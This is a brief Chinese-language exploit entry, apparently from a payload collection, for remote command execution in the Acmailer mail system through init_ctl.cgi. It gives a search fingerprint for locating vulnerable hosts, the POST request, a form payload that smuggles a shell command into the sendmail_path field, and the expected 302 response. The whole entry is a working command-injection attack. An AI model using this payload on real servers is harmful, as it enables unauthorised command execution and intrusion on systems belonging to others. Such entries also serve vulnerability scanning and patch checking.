# Acmailer邮件系统init_ctl.cgi远程命令执行

Acmailer ｜ 命令执行 ｜ —
- **指纹**：`body="CGI acmailer"`
- **请求**：`POST /init_ctl.cgi HTTP/1.1`

**Payload**
```
admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=id >dudesite.txt  bash&homeurl=http://&mypath=e
```
- **响应特征**：302